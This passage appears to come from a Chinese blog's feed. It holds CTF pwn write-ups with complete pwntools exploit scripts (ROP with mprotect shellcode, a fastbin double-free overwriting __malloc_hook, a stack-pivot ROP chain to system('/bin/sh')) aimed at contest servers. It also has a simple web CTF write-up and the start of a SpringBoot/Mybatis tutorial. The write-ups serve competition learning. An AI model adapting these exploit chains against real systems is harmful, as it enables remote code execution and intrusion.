p64(elf.plt['puts'])</span><br><span class="line"> payload += p64(0x400910)</span><br><span class="line"> sh.sendline(payload)</span><br><span class="line"> sh.recvuntil("?")</span><br><span class="line"> __libc_start_main = u64(sh.recvuntil("\nwarm",True)[-6:].ljust(8,'\x00'))</span><br><span class="line"> libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line"> system = libc +lib.symbols['system']</span><br><span class="line"> binsh = libc +lib.search("/bin/sh\x00").next()</span><br><span class="line"> gets = libc + lib.symbols['gets']</span><br><span class="line"> mprotect = libc+ lib.symbols['mprotect']</span><br><span class="line"> __free_hook = libc +lib.symbols['__free_hook']</span><br><span class="line"> __malloc_hook = libc +lib.symbols['__malloc_hook']</span><br><span class="line"> pop_rdx_ret = libc + lib.search(asm("pop rdx\nret")).next()</span><br><span class="line"> payload = 'a' * 0x18 + p64(canary) + 'a' * 8</span><br><span class="line"> payload += p64(pop_rdi_ret) + p64(elf.bss() + 0x500) + p64(gets)</span><br><span class="line"> payload += p64(pop_rdx_ret) + p64(7) + p64(pop_rsi_r15_ret) + p64(0x1000) + p64(0) + p64(pop_rdi_ret) + p64((elf.bss() >> 12) << 12) + p64(mprotect)</span><br><span class="line"> payload += p64(elf.bss() + 0x500)</span><br><span class="line"> sh.sendlineafter("!!!",'a')</span><br><span class="line"> sh.sendline(payload)</span><br><span class="line"> payload = ''</span><br><span class="line"> payload += shellcraft.open("flag")</span><br><span class="line"> payload += shellcraft.read(3,elf.bss()+0x100,0x30)</span><br><span class="line"> payload += shellcraft.write(1,elf.bss()+0x100,0x30)</span><br><span class="line"> sh.sendline(asm(payload))</span><br><span class="line"> sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line"> pwn("139.129.76.65",50007,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x04-easy-heap"><a href="#0x04-easy-heap" class="headerlink" title="0x04 easy_heap"></a>0x04 easy_heap</h2><hr><h3 id="典型的fastbin-attack题目，一开始程序叫你输入一句话，可以输入伪造的size为，我们可以使用double-free实现fastbin-attack把chunk申请到伪造的size这里，由于chunk可以达到0x48的大小，所以可以修改chunk-max-size实现malloc无大小限制，同时修改到第一个chunk-ptr为got，然后show一下就可以知道libc-base了，然后再一次double-free-fastbin-attack打-malloc-hook，将其覆盖为one-gadget，然后malloc一下就可以拿到shell了。"><a href="#典型的fastbin-attack题目，一开始程序叫你输入一句话，可以输入伪造的size为，我们可以使用double-free实现fastbin-attack把chunk申请到伪造的size这里，由于chunk可以达到0x48的大小，所以可以修改chunk-max-size实现malloc无大小限制，同时修改到第一个chunk-ptr为got，然后show一下就可以知道libc-base了，然后再一次double-free-fastbin-attack打-malloc-hook，将其覆盖为one-gadget，然后malloc一下就可以拿到shell了。" class="headerlink" title="典型的fastbin attack题目，一开始程序叫你输入一句话，可以输入伪造的size为，我们可以使用double free实现fastbin attack把chunk申请到伪造的size这里，由于chunk可以达到0x48的大小，所以可以修改chunk_max_size实现malloc无大小限制，同时修改到第一个chunk_ptr为got，然后show一下就可以知道libc_base了，然后再一次double free+fastbin attack打__malloc_hook，将其覆盖为one_gadget，然后malloc一下就可以拿到shell了。"></a>典型的fastbin attack题目，一开始程序叫你输入一句话，可以输入伪造的size为，我们可以使用double free实现fastbin attack把chunk申请到伪造的size这里，由于chunk可以达到0x48的大小，所以可以修改chunk_max_size实现malloc无大小限制，同时修改到第一个chunk_ptr为got，然后show一下就可以知道libc_base了，然后再一次double free+fastbin attack打__malloc_hook，将其覆盖为one_gadget，然后malloc一下就可以拿到shell了。</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("easy_heap")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line"> global lib</span><br><span class="line"> global sh</span><br><span class="line"> if(debug == 1):</span><br><span class="line">  sh = process("./easy_heap")</span><br><span class="line">  lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line"> else:</span><br><span class="line">  sh = remote(ip,port)</span><br><span class="line">  lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line"> def add(size,content):</span><br><span class="line">  sh.sendlineafter("4.","1")</span><br><span class="line">  sh.sendlineafter("?",str(size))</span><br><span class="line">  sh.sendafter("?",content)</span><br><span class="line"> def free(idx):</span><br><span class="line">  sh.sendlineafter("4.","2")</span><br><span class="line">  sh.sendlineafter("?",str(idx))</span><br><span class="line"> def show(idx):</span><br><span class="line">  sh.sendlineafter("4.","3")</span><br><span class="line">  sh.sendlineafter("?",str(idx))</span><br><span class="line"> chunk_list = 0x602080</span><br><span class="line"> chunk_size = 0x602078</span><br><span class="line"> sh.sendafter("?",p64(0x50) * 2)</span><br><span class="line"> add(0x48,'\x11' * 0x48)</span><br><span class="line"> add(0x48,'\x12' * 0x48)</span><br><span class="line"> free(0)</span><br><span class="line"> free(1)</span><br><span class="line"> free(0)</span><br><span class="line"> add(0x48,p64(0x602060))</span><br><span class="line"> add(0x48,p64(0x602060))</span><br><span class="line"> add(0x48,p64(0x602060))</span><br><span class="line"> payload = 'a' * 8 + p64(0x6666) + p64(elf.got['__libc_start_main'])</span><br><span class="line"> add(0x48,payload)</span><br><span class="line"> show(0)</span><br><span class="line"> __libc_start_main = u64(sh.recvuntil("\x7f",False)[-6:].ljust(8,'\x00'))</span><br><span class="line"> libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line"> system = libc +lib.symbols['system']</span><br><span class="line"> binsh = libc +lib.search("/bin/sh\x00").next()</span><br><span class="line"> __free_hook = libc +lib.symbols['__free_hook']</span><br><span class="line"> __malloc_hook = libc +lib.symbols['__malloc_hook']</span><br><span class="line"> one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]</span><br><span class="line"> add(0x68,'\x13' * 0x68)</span><br><span class="line"> add(0x68,'\x14' * 0x68)</span><br><span class="line"> free(6)</span><br><span class="line"> free(7)</span><br><span class="line"> free(6)</span><br><span class="line"> add(0x68,p64(__malloc_hook - 0x23))</span><br><span class="line"> add(0x68,p64(__malloc_hook - 0x23))</span><br><span class="line"> add(0x68,p64(__malloc_hook - 0x23))</span><br><span class="line"> payload = '\x00' * 3</span><br><span class="line"> payload += p64(0) * 2</span><br><span class="line"> payload += p64(libc+one_gadget[3])</span><br><span class="line"> add(0x68,payload)</span><br><span class="line"> sh.sendlineafter("4.","1")</span><br><span class="line"> sh.sendlineafter("?","666")</span><br><span class="line"> sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line"> pwn("139.129.76.65",50001,0)</span><br></pre></td></tr></tbody></table></figure></div><h2 id="0x05-easy-rop"><a href="#0x05-easy-rop" class="headerlink" title="0x05 easy_rop"></a>0x05 easy_rop</h2><hr><h3 id="利用-d的非正规字符绕过canary，然后顺便读取canary和pie，然后在栈里发现vulnerable-function的指针，然后通过pop，让ret-addr指向该指针，再一次进入vulnerable-function-然后设置好rbp为new-stack，ret-addr为leave-ret即可栈迁移，栈迁移之后先libc-leak，然后利用万能gadget调用read再一次更新new-stack的数据，将ret-addr指向system-“-bin-sh-x00”-就可以拿到shell了，中间少了负数的处理。所以要多打几次才能拿shell。"><a href="#利用-d的非正规字符绕过canary，然后顺便读取canary和pie，然后在栈里发现vulnerable-function的指针，然后通过pop，让ret-addr指向该指针，再一次进入vulnerable-function-然后设置好rbp为new-stack，ret-addr为leave-ret即可栈迁移，栈迁移之后先libc-leak，然后利用万能gadget调用read再一次更新new-stack的数据，将ret-addr指向system-“-bin-sh-x00”-就可以拿到shell了，中间少了负数的处理。所以要多打几次才能拿shell。" class="headerlink" title="利用%d的非正规字符绕过canary，然后顺便读取canary和pie，然后在栈里发现vulnerable_function的指针，然后通过pop，让ret_addr指向该指针，再一次进入vulnerable_function,然后设置好rbp为new_stack，ret_addr为leave_ret即可栈迁移，栈迁移之后先libc leak，然后利用万能gadget调用read再一次更新new_stack的数据，将ret_addr指向system(“/bin/sh\x00”)就可以拿到shell了，中间少了负数的处理。所以要多打几次才能拿shell。"></a>利用%d的非正规字符绕过canary，然后顺便读取canary和pie，然后在栈里发现vulnerable_function的指针，然后通过pop，让ret_addr指向该指针，再一次进入vulnerable_function,然后设置好rbp为new_stack，ret_addr为leave_ret即可栈迁移，栈迁移之后先libc leak，然后利用万能gadget调用read再一次更新new_stack的数据，将ret_addr指向system(“/bin/sh\x00”)就可以拿到shell了，中间少了负数的处理。所以要多打几次才能拿shell。</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2.7  </span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = "debug"</span><br><span class="line">context.arch = "amd64"</span><br><span class="line">elf = ELF("easy_rop")</span><br><span class="line">lib = 0</span><br><span class="line">sh = 0</span><br><span class="line">def pwn(ip,port,debug):</span><br><span class="line"> global lib</span><br><span class="line"> global sh</span><br><span class="line"> if(debug == 1):</span><br><span class="line">  sh = process("./easy_rop")</span><br><span class="line">  lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line"> else:</span><br><span class="line">  sh = remote(ip,port)</span><br><span class="line">  lib = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span><br><span class="line"> for i in range(26):</span><br><span class="line">  sh.sendlineafter(":",str(0))</span><br><span class="line"> sh.sendlineafter(":","--")</span><br><span class="line"> sh.recvuntil("number 26 = ")</span><br><span class="line"> canary = int(sh.recvuntil("\nnumber 27:",True),10)</span><br><span class="line"> sh.recvuntil("number 27 = ")</span><br><span class="line"> canary_head = int(sh.recvuntil("\nnumber 28",True),10)</span><br><span class="line"> canary = canary + (canary_head<<32) </span><br><span class="line"> sh.sendlineafter(":","--")</span><br><span class="line"> sh.recvuntil("number 28 = ")</span><br><span class="line"> pie = int(sh.recvuntil("\nnumber 29:",True),10)</span><br><span class="line"> sh.recvuntil("number 29 = ")</span><br><span class="line"> pie = (int(sh.recvuntil("\nnumber 30",True),10) << 32) + pie </span><br><span class="line"> pie -= 0xb40</span><br><span class="line"> pop_rbp_ret = pie + 0x900</span><br><span class="line"> leave_ret = pie + 0xb31</span><br><span class="line"> pop3_ret = pie + 0xb9f</span><br><span class="line"> new_stack = pie + 0x201420 - 8</span><br><span class="line"> pop_rdi_ret = pie + 0xba3</span><br><span class="line"> pop_rsi_r15_ret = pie + 0xba1</span><br><span class="line"> pop6_ret = 0xB9A + pie</span><br><span class="line"> call_gadget = 0xB80 + pie</span><br><span class="line"> def send(num):</span><br><span class="line">  if(num % 0x100000000 > 0x7fffffff):</span><br><span class="line">   sh.sendlineafter(":",str((-1 * num) % 0x100000000))</span><br><span class="line">  else:</span><br><span class="line">   sh.sendlineafter(":",str(num % 0x100000000))</span><br><span class="line">  sh.sendlineafter(":",str(num>>32))</span><br><span class="line"> send(pop3_ret)</span><br><span class="line"> send(new_stack)</span><br><span class="line"> payload  = "I love Ylg!!!"</span><br><span class="line"> payload += "I love Ylg!!!"</span><br><span class="line"> payload += "I love Ylg!!!"</span><br><span class="line"> payload += "I love Ylg!!!"</span><br><span class="line"> payload += "I love Ylg!!!"</span><br><span class="line"> payload += "I love Ylg!!!"</span><br><span class="line"> payload += "I love Ylg!!!"</span><br><span class="line"> payload += "I love Ylg!!!"</span><br><span class="line"> payload += "I love Ylg!!!"</span><br><span class="line"> payload += "I love Ylg!!!"</span><br><span class="line"> payload += "I love Ylg!!!"</span><br><span class="line"> payload += "I love Ylg!!!"</span><br><span class="line"> payload += "I love Ylg!!!"</span><br><span class="line"> sh.sendlineafter("?",payload)</span><br><span class="line"> for i in range(28):</span><br><span class="line">  sh.sendlineafter(":",'-')</span><br><span class="line"> send(new_stack)</span><br><span class="line"> send(leave_ret)</span><br><span class="line"> sh.sendlineafter(":","--")</span><br><span class="line"> payload  = p64(pop_rdi_ret)</span><br><span class="line"> payload += p64(elf.got['__libc_start_main'] + pie)</span><br><span class="line"> payload += p64(elf.plt['puts'] + pie)</span><br><span class="line"> payload += p64(pop6_ret)</span><br><span class="line"> payload += p64(0) + p64(1) + p64(pie + elf.got['read']) + p64(0x666) + p64(new_stack + 8) + p64(0)</span><br><span class="line"> payload += p64(call_gadget)</span><br><span class="line"> sh.sendlineafter("?",payload)</span><br><span class="line"> __libc_start_main = u64(sh.recvuntil("\x7f")[-6:].ljust(8,"\x00"))</span><br><span class="line"> libc = __libc_start_main - lib.symbols['__libc_start_main']</span><br><span class="line"> system = libc +lib.symbols['system']</span><br><span class="line"> binsh = libc +lib.search("/bin/sh\x00").next()</span><br><span class="line"> __free_hook = libc +lib.symbols['__free_hook']</span><br><span class="line"> __malloc_hook = libc +lib.symbols['__malloc_hook']</span><br><span class="line"> payload = 'a' * 80</span><br><span class="line"> payload += p64(pop_rdi_ret)</span><br><span class="line"> payload += p64(binsh)</span><br><span class="line"> payload += p64(system)</span><br><span class="line"> sleep(0.2)</span><br><span class="line"> sh.sendline(payload)</span><br><span class="line"> sh.interactive()</span><br><span class="line">if __name__ == "__main__":</span><br><span class="line"> pwn("139.129.76.65",50002,0)</span><br></pre></td></tr></tbody></table></figure></div></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-2019年11月成都大学CTF</title>
      <link href="/2019/11/13/CTF-2019%E5%B9%B411%E6%9C%88%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6CTF/"/>
      <url>/2019/11/13/CTF-2019%E5%B9%B411%E6%9C%88%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6CTF/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="1、POST"><a href="#1、POST" class="headerlink" title="1、POST"></a>1、POST</h2><hr><h3 id="打开网页，输出以下内容"><a href="#打开网页，输出以下内容" class="headerlink" title="打开网页，输出以下内容"></a>打开网页，输出以下内容</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><!--?php</span--><br><span class="line">error_reporting(0);</span><br><span class="line">include('flag.php');</span><br><span class="line">if($_GET['p1'] == '' or $_GET['p2'] == '') {</span><br><span class="line">    header('location: index.php?p1=CDUSEC&p2=CTF');</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">highlight_file('index.php');</span><br><span class="line">print $_GET['p1'];</span><br><span class="line">print '<br>';</span><br><span class="line">print $_GET['p2'];</span><br><span class="line">print '<br>';</span><br><span class="line"></span><br><span class="line">if($_POST['p4'] === 'flag') {</span><br><span class="line">    print $flag;</span><br><span class="line">}</span><br></span></pre></td></tr></tbody></table></figure></div><h3 id="题目要求GET传参p1、p2为非空值，POST传参p4为flag字符串"><a href="#题目要求GET传参p1、p2为非空值，POST传参p4为flag字符串" class="headerlink" title="题目要求GET传参p1、p2为非空值，POST传参p4为flag字符串"></a>题目要求GET传参p1、p2为非空值，POST传参p4为flag字符串</h3><h3 id="使用Burp-Suite发包即可，封包如下"><a href="#使用Burp-Suite发包即可，封包如下" class="headerlink" title="使用Burp Suite发包即可，封包如下"></a>使用Burp Suite发包即可，封包如下</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?p1=CDUSEC&p2=CTF HTTP/1.1</span><br><span class="line">Host: 47.93.249.236:10007</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 7</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">p4=flag</span><br></pre></td></tr></tbody></table></figure></div><h3 id="发送后输出flag-Tw0-E4sy-pHp"><a href="#发送后输出flag-Tw0-E4sy-pHp" class="headerlink" title="发送后输出flag{Tw0~E4sy-pHp}"></a>发送后输出flag{Tw0~E4sy-pHp}</h3><h2 id="2、百度"><a href="#2、百度" class="headerlink" title="2、百度"></a>2、百度</h2><hr><h3 id="打开网页后没有什么提示，于是看一下源码也没有什么提示，然后再看一下封包也没有什么提示，那么必须要扫一下目录了"><a href="#打开网页后没有什么提示，于是看一下源码也没有什么提示，然后再看一下封包也没有什么提示，那么必须要扫一下目录了" class="headerlink" title="打开网页后没有什么提示，于是看一下源码也没有什么提示，然后再看一下封包也没有什么提示，那么必须要扫一下目录了"></a>打开网页后没有什么提示，于是看一下源码也没有什么提示，然后再看一下封包也没有什么提示，那么必须要扫一下目录了</h3><h3 id="用御剑扫一下目录，发现robots-txt，打开后输出flag"><a href="#用御剑扫一下目录，发现robots-txt，打开后输出flag" class="headerlink" title="用御剑扫一下目录，发现robots.txt，打开后输出flag"></a>用御剑扫一下目录，发现robots.txt，打开后输出flag</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#flag{BoBo-RoRo-ToTo}</span><br><span class="line">User-agent: *</span><br><span class="line">Disallow:</span><br></pre></td></tr></tbody></table></figure></div><h3 id="得到flag-BoBo-RoRo-ToTo"><a href="#得到flag-BoBo-RoRo-ToTo" class="headerlink" title="得到flag{BoBo-RoRo-ToTo}"></a>得到flag{BoBo-RoRo-ToTo}</h3></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringBoot+Mybatis+Thymeleaf_基础开发</title>
      <link href="/2019/11/05/SpringBoot+Mybatis+Thymeleaf_%E5%9F%BA%E7%A1%80%E5%BC%80%E5%8F%91/"/>
      <url>/2019/11/05/SpringBoot+Mybatis+Thymeleaf_%E5%9F%BA%E7%A1%80%E5%BC%80%E5%8F%91/</url>
      
        <content type="html"><![CDATA[<html lang="en" xmlns:th="http://www.thymeleaf.org"><head></head><body><h1 id="SpringBoot-Mybatis-简单的测试"><a href="#SpringBoot-Mybatis-简单的测试" class="headerlink" title="SpringBoot + Mybatis 简单的测试"></a>SpringBoot + Mybatis 简单的测试</h1><h2 id="1、基础配置"><a href="#1、基础配置" class="headerlink" title="1、基础配置"></a>1、基础配置</h2><hr><h3 id="首先我们对环境进行配置，pom-xml的dependencies配置如下"><a href="#首先我们对环境进行配置，pom-xml的dependencies配置如下" class="headerlink" title="首先我们对环境进行配置，pom.xml的dependencies配置如下"></a>首先我们对环境进行配置，pom.xml的dependencies配置如下</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><dependencies></dependencies></span><br><span class="line">    <dependency></dependency></span><br><span class="line">        <groupid>org.springframework.boot</groupid></span><br><span class="line">        <artifactid>spring-boot-starter-thymeleaf</artifactid></span><br><span class="line">    </span><br><span class="line">    <dependency></dependency></span><br><span class="line">        <groupid>org.springframework.boot</groupid></span><br><span class="line">        <artifactid>spring-boot-starter-web</artifactid></span><br><span class="line">    </span><br><span class="line">    <dependency></dependency></span><br><span class="line">        <groupid>org.springframework.boot</groupid></span><br><span class="line">        <artifactid>spring-boot-starter-test</artifactid></span><br><span class="line">        <scope>test</scope></span><br><span class="line">        <exclusions></exclusions></span><br><span class="line">            <exclusion></exclusion></span><br><span class="line">                <groupid>org.junit.vintage</groupid></span><br><span class="line">                <artifactid>junit-vintage-engine</artifactid></span><br><span class="line">            </span><br><span class="line">        </span><br><span class="line">    </span><br><span class="line">    <dependency></dependency></span><br><span class="line">        <groupid>mysql</groupid></span><br><span class="line">        <artifactid>mysql-connector-java</artifactid></span><br><span class="line">        <version>8.0.17</version></span><br><span class="line">    </span><br><span class="line">    <dependency></dependency></span><br><span class="line">        <groupid>org.mybatis.spring.boot</groupid></span><br><span class="line">        <artifactid>mybatis-spring-boot-starter</artifactid></span><br><span class="line">        <version>2.0.0</version></span><br><span class="line">    </span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure></div><h3 id="经过测试mybatis为默认，mysql为8-0-17，springboot只需要用默认的即可，thymeleaf也是用默认的即可。"><a href="#经过测试mybatis为默认，mysql为8-0-17，springboot只需要用默认的即可，thymeleaf也是用默认的即可。" class="headerlink" title="经过测试mybatis为默认，mysql为8.0.17，springboot只需要用默认的即可，thymeleaf也是用默认的即可。"></a>经过测试mybatis为默认，mysql为8.0.17，springboot只需要用默认的即可，thymeleaf也是用默认的即可。</h3><h3 id="然后对application-properties进行配置，配置如下："><a href="#然后对application-properties进行配置，配置如下：" class="headerlink" title="然后对application.properties进行配置，配置如下："></a>然后对application.properties进行配置，配置如下：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">spring.datasource.url=jdbc:mysql://localhost:3306/数据库名?useUnicode=true&characterEncoding=UTF-8&serverTimezone=UTC</span><br><span class="line">spring.datasource.username=数据库登录账号</span><br><span class="line">spring.datasource.password=数据库登录密码</span><br><span class="line">spring.datasource.driver-class-name=com.mysql.cj.jdbc.Driver</span><br><span class="line">mybatis.mapper-locations=classpath:mapping/*.xml    #locations目录默认以resources为根目录</span><br></pre></td></tr></tbody></table></figure></div><h2 id="2、SpringBoot-Mybatis-的层"><a href="#2、SpringBoot-Mybatis-的层" class="headerlink" title="2、SpringBoot + Mybatis 的层"></a>2、SpringBoot + Mybatis 的层</h2><hr><h3 id="一般情况下我们分为四层"><a href="#一般情况下我们分为四层" class="headerlink" title="一般情况下我们分为四层"></a>一般情况下我们分为四层</h3><h3 id="controller层：调用service层的接口，进行业务操作。"><a href="#controller层：调用service层的接口，进行业务操作。" class="headerlink" title="controller层：调用service层的接口，进行业务操作。"></a>controller层：调用service层的接口，进行业务操作。</h3><h3 id="entity层：entity层和model层等价，存放的是实体类，属性值与数据库中的属性值保持一致。实现set和get方法（这一步不可以少，少一个get或者set都不行，只需要默认的get和set即可）。"><a href="#entity层：entity层和model层等价，存放的是实体类，属性值与数据库中的属性值保持一致。实现set和get方法（这一步不可以少，少一个get或者set都不行，只需要默认的get和set即可）。" class="headerlink" title="entity层：entity层和model层等价，存放的是实体类，属性值与数据库中的属性值保持一致。实现set和get方法（这一步不可以少，少一个get或者set都不行，只需要默认的get和set即可）。"></a>entity层：entity层和model层等价，存放的是实体类，属性值与数据库中的属性值保持一致。实现set和get方法（这一步不可以少，少一个get或者set都不行，只需要默认的get和set即可）。</h3><h3 id="mapper层：dao层和mapper层等价，对数据库进行持久化操作，它的方法是针对数据库操作的，基本用到的就是增删改查。他只是定义一个接口，然后在mapper-xml中实现接口和数据库的交互。"><a href="#mapper层：dao层和mapper层等价，对数据库进行持久化操作，它的方法是针对数据库操作的，基本用到的就是增删改查。他只是定义一个接口，然后在mapper-xml中实现接口和数据库的交互。" class="headerlink" 